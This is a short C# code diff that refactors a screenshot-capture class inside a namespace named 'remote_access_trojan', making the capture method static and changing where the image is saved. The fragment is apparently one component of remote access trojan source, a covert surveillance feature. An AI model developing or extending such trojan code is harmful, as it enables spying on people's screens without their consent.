@@ -13,14 +13,7 @@ namespace remote_access_trojan
 {
     class Screenshot
     {
-        // vars up here
-
-        public Screenshot()
-        {
-            // set vars
-        }
-
-        public void takeScreenshot()
+        public static void takeScreenshot()
         {
             // Create Bitmap image to store screenshot in
             Bitmap image;
@@ -36,8 +29,7 @@ namespace remote_access_trojan
             string str = "";
             try
             {
-                str = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
-                      @"\Screenshot.png");
+                str = Path.Combine(Directory.GetCurrentDirectory(), "screenshot.png");
             }
             catch (Exception er)
             {
